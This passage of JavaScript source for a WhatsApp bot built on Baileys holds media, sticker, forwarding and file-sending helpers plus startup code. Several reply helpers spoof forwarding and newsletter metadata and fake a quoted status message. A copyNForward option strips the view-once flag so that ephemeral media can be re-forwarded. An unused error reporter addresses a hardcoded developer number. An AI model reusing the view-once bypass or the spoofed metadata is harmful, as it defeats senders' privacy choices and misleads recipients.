                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idch,
                        newsletterName: global.namech,
                        serverMessageId: -1
                    },
                    ...(message.contextInfo || {})
                }
            },
            { 
                quoted: quoted || {
                    key: {
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast"
                    },
                    message: {
                        conversation: `✨ ${global.botname} ✨`
                    }
                }
            }
        );

    } catch (e) {
        console.error("conn.reply error:", e);
    }
};
  //=================================================//
  conn.sendImageAsStickerAvatar = async (
    jid,
    path,
    quoted,
    options = {},
  ) => {
    let buff = Buffer.isBuffer(path) ?
      path :
      /^data:.*?\/.*?;base64,/i.test(path) ?
      Buffer.from(path.split `,` [1], "base64") :
      /^https?:\/\//.test(path) ?
      await await getBuffer(path) :
      fs.existsSync(path) ?
      fs.readFileSync(path) :
      Buffer.alloc(0);
    let buffer;
    if (options && (options.packname || options.author)) {
      buffer = await writeExifImgAvatar(buff, options);
    } else {
      buffer = await imageToWebpAvatar(buff);
    }
    await conn.sendMessage(
      jid, {
        sticker: {
          url: buffer,
        },
        ...options,
      }, {
        quoted,
      },
    ).then((response) => {
      fs.unlinkSync(buffer);
      return response;
    });
  };
  //=================================================//
  conn.sendVideoAsStickerAvatar = async (
    jid,
    path,
    quoted,
    options = {},
  ) => {
    let buff = Buffer.isBuffer(path) ?
      path :
      /^data:.*?\/.*?;base64,/i.test(path) ?
      Buffer.from(path.split `,` [1], "base64") :
      /^https?:\/\//.test(path) ?
      await await getBuffer(path) :
      fs.existsSync(path) ?
      fs.readFileSync(path) :
      Buffer.alloc(0);
    let buffer;
    if (options && (options.packname || options.author)) {
      buffer = await writeExifVidAvatar(buff, options);
    } else {
      buffer = await videoToWebpAvatar(buff);
    }
    await conn.sendMessage(
      jid, {
        sticker: {
          url: buffer,
        },
        ...options,
      }, {
        quoted,
      },
    );
    return buffer;
  };
  //=================================================//
  conn.copyNForward = async (
    jid,
    message,
    forceForward = false,
    options = {},
  ) => {
    let vtype;
    if (options.readViewOnce) {
      message.message =
        message.message &&
        message.message.ephemeralMessage &&
        message.message.ephemeralMessage.message ?
        message.message.ephemeralMessage.message :
        message.message || undefined;
      vtype = Object.keys(message.message.viewOnceMessage.message)[0];
      delete(message.message && message.message.ignore ?
        message.message.ignore :
        message.message || undefined);
      delete message.message.viewOnceMessage.message[vtype].viewOnce;
      message.message = {
        ...message.message.viewOnceMessage.message,
      };
    }
    let mtype = Object.keys(message.message)[0];
    let content = await generateForwardMessageContent(message, forceForward);
    let ctype = Object.keys(content)[0];
    let context = {};
    if (mtype != "conversation") context = message.message[mtype].contextInfo;
    content[ctype].contextInfo = {
      ...context,
      ...content[ctype].contextInfo,
    };
    const waMessage = await generateWAMessageFromContent(
      jid,
      content,
      options ? {
        ...content[ctype],
        ...options,
        ...(options.contextInfo ? {
          contextInfo: {
            ...content[ctype].contextInfo,
            ...options.contextInfo,
          },
        } : {}),
      } : {},
    );
    await conn.relayMessage(jid, waMessage.message, {
      messageId: waMessage.key.id,
    });
    return waMessage;
  };
  //=================================================//
  conn.downloadAndSaveMediaMessage = async (
    message,
    filename,
    attachExtension = true,
  ) => {
    let quoted = message.msg ? message.msg : message;
    let mime = (message.msg || message).mimetype || "";
    let messageType = message.type ?
      message.type.replace(/Message/gi, "") :
      mime.split("/")[0];
    const stream = await downloadContentFromMessage(quoted, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    let type = await FileType.fromBuffer(buffer);
    let trueFileName;
    if (type.ext == "ogg" || type.ext == "opus") {
      trueFileName = attachExtension ? filename + ".mp3" : filename;
      await fs.writeFileSync(trueFileName, buffer);
    } else {
      trueFileName = attachExtension ? filename + "." + type.ext : filename;
      await fs.writeFileSync(trueFileName, buffer);
    }
    return trueFileName;
  };
  //=================================================//
  conn.downloadMediaMessage = async (message) => {
    let mime = (message.msg || message).mimetype || "";
    let messageType = message.type ?
      message.type.replace(/Message/gi, "") :
      mime.split("/")[0];
    const stream = await downloadContentFromMessage(message, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    return buffer;
  };
  //=================================================//
  conn.getFile = async (PATH, save) => {
    let res;
    let filename;
    let data = Buffer.isBuffer(PATH) ?
      PATH :
      /^data:.*?\/.*?;base64,/i.test(PATH) ?
      Buffer.from(PATH.split `,` [1], "base64") :
      /^https?:\/\//.test(PATH) ?
      await (res = await getBuffer(PATH)) :
      fs.existsSync(PATH) ?
      ((filename = PATH), fs.readFileSync(PATH)) :
      typeof PATH === "string" ?
      PATH :
      Buffer.alloc(0);

    // Ganti FileType.fromBuffer menjadi fileTypeFromBuffer
    let type = (await fileTypeFromBuffer(data)) || {
      mime: "application/octet-stream",
      ext: ".bin",
    };

    if (data && save) fs.promises.writeFile(filename, data);

    return {
      res,
      filename,
      size: await getSizeMedia(data),
      ...type,
      data,
    };
};
  //=================================================//
  conn.sendText = (jid, text, quoted = "", options) =>
    conn.sendMessage(
      jid, {
        text: text,
        ...options,
      }, {
        quoted,
      },
    );
  //=================================================//
  conn.serializeM = (m) => global.serialize(m, conn, store);
  /**
   * Send Media/File with Automatic Type Specifier
   * @param {String} jid
   * @param {String|Buffer} path
   * @param {String} filename
   * @param {String} caption
   * @param {import('@whiskeysockets/baileys').proto.WebMessageInfo} quoted
   * @param {Boolean} ptt
   * @param {Object} options
   */
  conn.sendFile = async (
    jid,
    path,
    filename = "",
    caption = "",
    quoted,
    ptt = false,
    options = {},
  ) => {
    let type = await conn.getFile(path, true);
    let {
      res,
      data: file,
      filename: pathFile
    } = type;
    if ((res && res.status !== 200) || file.length <= 65536) {
      try {
        throw {
          json: JSON.parse(file.toString()),
        };
      } catch (e) {
        if (e.json) throw e.json;
      }
    }
    const fileSize = fs.statSync(pathFile).size / 1024 / 1024;
    if (fileSize >= 1800) throw new Error(" The file size is too large\n\n");
    let opt = {};
    if (quoted) opt.quoted = quoted;
    if (!type) options.asDocument = true;
    let mtype = "",
      mimetype = options.mimetype || type.mime,
      convert;
    if (
      /webp/.test(type.mime) ||
      (/image/.test(type.mime) && options.asSticker)
    )
      mtype = "sticker";
    else if (
      /image/.test(type.mime) ||
      (/webp/.test(type.mime) && options.asImage)
    )
      mtype = "image";
    else if (/video/.test(type.mime)) mtype = "video";
    else if (/audio/.test(type.mime))
      (convert = await toAudio(file, type.ext)),
      (file = convert.data),
      (pathFile = convert.filename),
      (mtype = "audio"),
      (mimetype = options.mimetype || "audio/mpeg; codecs=mp3");
    else mtype = "document";
    if (options.asDocument) mtype = "document";
    delete options.asSticker;
    delete options.asLocation;
    delete options.asVideo;
    delete options.asDocument;
    delete options.asImage;
    let message = {
      ...options,
      caption,
      ptt,
      [mtype]: {
        url: pathFile,
      },
      mimetype,
      fileName: filename || pathFile.split("/").pop(),
    };
    /**
     * @type {import('@whiskeysockets/baileys').proto.WebMessageInfo}
     */
    let m;
    try {
      m = await conn.sendMessage(jid, message, {
        ...opt,
        ...options,
      });
    } catch (e) {
      console.error(e);
      m = null;
    } finally {
      if (!m)
        m = await conn.sendMessage(
          jid, {
            ...message,
            [mtype]: file,
          }, {
            ...opt,
            ...options,
          },
        );
      file = null; // releasing the memory
      return m;
    }
  };
  //=================================================//
  conn.sendFile = async (jid, media, filename = '', caption = '', quoted = null, options = {}) => {
  try {
    let file = await conn.getFile(media);
    let ext = file.ext ? file.ext.toLowerCase() : "";
    let type;
    let mimetype;

    // Tentukan tipe file berdasarkan ekstensi
    switch (ext) {
      case "mp3":
        type = "audio";
        mimetype = "audio/mpeg";
        break;

      case "jpg":
      case "jpeg":
      case "png":
        type = "image";
        break;

      case "webp":
        type = "sticker";
        break;

      case "mp4":
        type = "video";
        break;

      default:
        type = "document";
        mimetype = file.mime;
        break;
    }

    // Build message
    let message = {
      [type]: file.data,
      mimetype: options.mimetype || mimetype,
      fileName: filename || `file.${ext}`,
      caption: caption || options.caption || ""
    };

    // PTT / VN
    if (type === "audio" && options.ptt) {
      message.ptt = true;
    }

    // Opsi internal Baileys
    let sendOptions = {
      quoted: quoted || options.quoted || null
    };

    return await conn.sendMessage(jid, message, sendOptions);

  } catch (err) {
    console.error("sendFile error:", err);
    throw err;
  }
};
  //=================================================//
  conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
    let mime = "";
    let res = await axios.head(url);
    mime = res.headers["content-type"];
    if (mime.split("/")[1] === "gif") {
      return conn.sendMessage(
        jid, {
          video: await getBuffer(url),
          caption: caption,
          gifPlayback: true,
          ...options,
        }, {
          quoted: quoted,
          ...options,
        },
      );
    }
    let type = mime.split("/")[0] + "Message";
    if (mime === "application/pdf") {
      return conn.sendMessage(
        jid, {
          document: await getBuffer(url),
          mimetype: "application/pdf",
          caption: caption,
          ...options,
        }, {
          quoted: quoted,
          ...options,
        },
      );
    }
    if (mime.split("/")[0] === "image") {
      return conn.sendMessage(
        jid, {
          image: await getBuffer(url),
          caption: caption,
          ...options,
        }, {
          quoted: quoted,
          ...options,
        },
      );
    }
    if (mime.split("/")[0] === "video") {
      return conn.sendMessage(
        jid, {
          video: await getBuffer(url),
          caption: caption,
          mimetype: "video/mp4",
          ...options,
        }, {
          quoted: quoted,
          ...options,
        },
      );
    }
    if (mime.split("/")[0] === "audio") {
      return conn.sendMessage(
        jid, {
          audio: await getBuffer(url),
          caption: caption,
          mimetype: "audio/mpeg",
          ...options,
        }, {
          quoted: quoted,
          ...options,
        },
      );
    }
  };
  /**
   *
   * @param {*} jid
   * @param {*} name
   * @param [*] values
   * @returns
   */
  /*
  conn.sendPoll = (jid, name = "", values = [], selectableCount = 1) => {
  return conn.sendMessage(jid, {
  poll: {
  name,
  values,
  selectableCount,
  },
  });
  };
  */
  /**
   * @typedef Media
   * @prop {"image"|"video"|"document"} type
   * @prop {buffer|{ url: string }} data
   * @prop {{}} [options]
   */
  /**
   * @typedef Button
   * @prop {Section[]} [sections]
   */
  /**
   * @typedef Section
   * @prop {string} title
   * @prop {Row[]} rows
   */
  /**
   * @typedef Row
   * @prop {string} header
   * @prop {string} title
   * @prop {string} description
   * @prop {string} id
   */
  /**
   * Function to send interactiveMessage
   *
   * @param {string} jid
   * @param {string} body
   * @param {string} [footer]
   * @param {string} title
   * @param {string} [subtitle]
   * @param {Media} [media]
   * @param {Button[]} buttons
   * @param {proto.WebMessageInfo} [quoted]
   * @param {{}} [options={}]
   * @returns {Promise<proto.WebMessageInfo>}
   */

  // ### End of sending message ###
  conn.pairingCode = pairingCode
  return conn;
}

/* ================= ERROR REPORT SYSTEM ================= */

function setupErrorReporter(conn) {

  const DEV_JID = "6285102360656@s.whatsapp.net"

  const sendErrorReport = async (err, type = "UNKNOWN") => {
    try {

      const time = moment().tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")
      const ramUsed = (process.memoryUsage().rss / 1024 / 1024).toFixed(2)
      const uptime = Math.floor(process.uptime())

      const message = `
╭━━━〔 ⚠️ BOT ERROR REPORT 〕━━━⬣
┃ 📌 Type    : ${type}
┃ 🕒 Time    : ${time}
┃ ⏳ Uptime  : ${uptime} sec
┃ 💾 RAM     : ${ramUsed} MB
╰━━━━━━━━━━━━━━━━━━━━━━⬣

📛 Error Message:
${err?.stack || err}
`.trim()

      const targets = [
        ...global.owner.map(v =>
          v.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
        ),
        DEV_JID
      ]

      for (let jid of targets) {
        await conn.sendMessage(jid, {
          text: message
        })
      }

    } catch (e) {
      console.log("ERROR REPORT FAILED:", e.message)
    }
  }

}

process.on("uncaughtException", (err) => {
  if (isIgnorableRuntimeError(err)) {
    console.log(chalk.yellow(`[RUNTIME] transient uncaught exception diabaikan: ${err}`))
    return
  }
  console.error("UNCAUGHT ERROR:", err)
})

process.on("unhandledRejection", (err) => {
  if (isIgnorableRuntimeError(err)) {
    console.log(chalk.yellow(`[RUNTIME] transient rejection diabaikan: ${err}`))
    return
  }
  console.error("UNHANDLED REJECTION:", err)
})

try {
  setupSessionHealthMonitor();
  console.log(chalk.cyan("\n[+] Memuat plugins..."));
  await Plugins.load();
  console.log(chalk.green(`[✓] ${Object.keys(Plugins.plugins).length} plugin berhasil dimuat.`));
  console.log(chalk.green(`\n[✓] ${global.botname} siap digunakan!`));
  const conn = await panel({
    getSessions,
    getBots,
    chooseSession,
    addSession,
    removeSession,
    startAllBots,
    chooseBotz,
    addBotz,
    removeBotz,
    startAllBotz,
    startAllBotzAndSessions,
    startSession,
    startTelegramBot,
    waSocket,
    getDefaultSessionConfig,
    stopBotz
  });
} catch (e) {
  console.error(chalk.bgRed("[!] Gagal memulai bot:"), e);
}
